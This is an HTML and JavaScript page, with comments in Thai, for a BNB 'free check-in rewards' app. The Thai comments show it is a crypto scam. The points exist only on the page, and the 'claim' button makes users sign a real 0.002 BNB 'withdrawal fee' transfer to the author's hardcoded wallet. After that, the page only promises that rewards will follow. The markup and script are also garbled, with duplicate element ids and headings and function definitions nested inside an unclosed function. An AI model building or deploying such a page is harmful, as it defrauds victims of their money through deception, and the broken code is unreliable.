<body>

<div class="container">
    <h1>🎁 แอปตารางรับรางวัล</h1>
    <p>กรอกหมายเลขกระเป๋า BNB เพื่อเช็คอินรับแต้ม</p>
    <h1>🎁 แอปสะสมแต้มรับเหรียญ</h1>
    <p style="color: #aaa; font-size: 14px;">เช็คอินสะสมแต้มฟรี เพื่อนำไปแลกถอนเหรียญรางวัลจริง</p>
    
    <!-- ส่วนกรอกที่อยู่และแสดงแต้มจำลอง -->
    <input type="text" id="walletInput" placeholder="กรอกหมายเลขกระเป๋า BNB ของคุณ...">

    <input type="text" id="walletInput" placeholder="ใส่หมายเลขกระเป๋าเงิน (Wallet Address)...">
    <button onclick="handleCheckIn()">กดเช็คอินรับแต้ม (+10 แต้ม)</button>
    <div class="score-box">
        แต้มสะสมปัจจุบันของคุณ: <span id="userPoints" class="score-num">0</span> แต้ม
    </div>

    <!-- ฟังก์ชันที่ 1: เช็คอินสะสมแต้มฟรี -->
    <button class="btn-checkin" onclick="handleFreeCheckIn()">📅 กดเช็คอินประจำวัน (ฟรี)</button>

    <div id="message"></div>
    <div class="divider"></div>
    
    <!-- ฟังก์ชันที่ 2: ถอนรางวัลเข้ากระเป๋า (เรียกเก็บค่าธรรมเนียมเข้ากระเป๋าคุณพี่) -->
    <button class="btn-claim" onclick="handleClaimRewards()">💰 กดถอนเหรียญเข้ากระเป๋าตนเอง</button>
    <div class="fee-info">⚠️ มีค่าธรรมเนียมในการถอนโอนเหรียญออกจากระบบ</div>

    <!-- แถบแสดงสถานะระบบ -->
    <div id="statusMessage" class="status"></div>
</div>

<script>
    async function handleCheckIn() {
    // 📍 จุดสำคัญ: แก้ไขเปลี่ยนตรงนี้เป็นหมายเลขกระเป๋า BNB ของคุณพี่เพื่อรอรับเงินค่าธรรมเนียมครับ
    const MY_RECEIVER_ADDRESS = "0x06B020DCcd0b2b005264c9a31cAba3b7e4A4bF27"; 
    
    // ตั้งค่าธรรมเนียมการถอนรางวัลที่เขาต้องจ่ายให้เรา (ตัวอย่าง: 0.002 BNB)
    const CLAIM_FEE_BNB = "0.002"; 
    
    let currentPoints = 0; // ตัวแปรเก็บแต้มจำลองหน้าเว็บ

    // 1. ระบบเช็คอินฟรี (ยิงไปหา api/checkin.js ตัวเก่าของคุณพี่เพื่อส่งเมลแจ้งเตือน)
    async function handleFreeCheckIn() {
        const walletAddress = document.getElementById('walletInput').value.trim();
        const messageDiv = document.getElementById('message');
        const statusDiv = document.getElementById('statusMessage');

        if (!walletAddress) {
            messageDiv.style.color = '#ff9800';
            messageDiv.innerText = '⚠️ กรุณากรอกหมายเลขกระเป๋าเงินก่อนครับ';
            statusDiv.style.color = '#ff9800';
            statusDiv.innerText = '⚠️ กรุณากรอกหมายเลขกระเป๋าเงินก่อนทำการเช็คอินครับ';
            return;
        }

        messageDiv.style.color = '#cbd5e1';
        messageDiv.innerText = '⏳ กำลังบันทึกข้อมูลและส่งอีเมลแจ้งเตือน...';
        statusDiv.style.color = '#cbd5e1';
        statusDiv.innerText = '⏳ กำลังบันทึกข้อมูลและส่งอีเมลแจ้งแต้มสะสม...';

        try {
            // เรียกไปที่หลังบ้านในโปรเจกต์เดียวกันโดยตรง
            const response = await fetch('/api/checkin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ walletAddress: walletAddress })
            });
            
            const data = await response.json();

            if (data.success) {
                messageDiv.style.color = '#4CAF50';
                messageDiv.innerText = '🎉 ' + data.message;
                currentPoints += 10; // เพิ่มแต้มให้ผู้ใช้บนหน้าจอ
                document.getElementById('userPoints').innerText = currentPoints;
                statusDiv.style.color = '#4CAF50';
                statusDiv.innerText = '🎉 ' + data.message;
            } else {
                messageDiv.style.color = '#f44336';
                messageDiv.innerText = '❌ ' + data.message;
                statusDiv.style.color = '#f44336';
                statusDiv.innerText = '❌ ' + data.message;
            }
        } catch (error) {
            console.error('Error:', error);
            messageDiv.style.color = '#f44336';
            messageDiv.innerText = '❌ เกิดข้อผิดพลาดในระบบ แต่แต้มอาจจะถูกบันทึกแล้ว';
            statusDiv.style.color = '#f44336';
            statusDiv.innerText = '❌ ระบบเช็คอินติดขัดชั่วคราว';
        }
    }

    // 2. ระบบกดแลกรับรางวัล (เรียกเก็บเงินจริงจากผู้ใช้ ส่งเข้ากระเป๋าคุณพี่)
    async function handleClaimRewards() {
        const statusDiv = document.getElementById('statusMessage');
        const walletAddress = document.getElementById('walletInput').value.trim();

        if (currentPoints < 10) {
            statusDiv.style.color = '#ff9800';
            statusDiv.innerText = '⚠️ คุณต้องเช็คอินสะสมแต้มให้ได้อย่างน้อย 10 แต้มก่อนถอนรางวัลครับ';
            return;
        }

        if (!window.ethereum) {
            statusDiv.style.color = '#f44336';
            statusDiv.innerText = "❌ ไม่พบแอปกระเป๋าเงิน! กรุณาเปิดหน้านี้ผ่านเบราว์เซอร์ในแอป MetaMask หรือ Trust Wallet";
            return;
        }

        try {
            statusDiv.style.color = '#cbd5e1';
            statusDiv.innerText = "⏳ กำลังเชื่อมต่อแอปกระเป๋าเงินเพื่อเรียกชำระค่าธรรมเนียม...";
            
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            
            statusDiv.innerText = `⏳ กรุณากดยืนยันจ่ายค่าธรรมเนียมจำนวน ${CLAIM_FEE_BNB} BNB ในแอปกระเป๋าเงินของคุณ...`;

            // บังคับเปิดหน้าต่างกระเป๋าเงินเพื่อตัดเงินโอนเข้ากระเป๋าของคุณพี่
            const tx = await signer.sendTransaction({
                to: MY_RECEIVER_ADDRESS,
                value: ethers.utils.parseEther(CLAIM_FEE_BNB)
            });

            statusDiv.innerText = "⏳ กำลังตรวจสอบและบันทึกธุรกรรมบนบล็อกเชน (ห้ามปิดหน้านี้)...";
            await tx.wait(); // รอจนโอนสำเร็จจริงเงินเข้ากระเป๋าคุณพี่ชัวร์ๆ

            // รีเซ็ตแต้มหน้าจอกลับเป็นศูนย์หลังถอนสำเร็จ
            currentPoints = 0;
            document.getElementById('userPoints').innerText = currentPoints;

            statusDiv.style.color = '#4CAF50';
            statusDiv.innerText = `🎉 ถอนรางวัลสำเร็จ! ค่าธรรมเนียมถูกโอนเข้ากระเป๋าแอดมินแล้ว ระบบจะดำเนินการส่งเหรียญเข้ากระเป๋าคุณในลำดับถัดไป`;

        } catch (error) {
            console.error(error);
            statusDiv.style.color = '#f44336';
            statusDiv.innerText = "❌ ทำรายการไม่สำเร็จ เนื่องจากผู้ใช้ยกเลิกการโอนเงินหรือยอดเงินไม่พอจ่ายค่าธรรมเนียม";
        }
    }
</script>
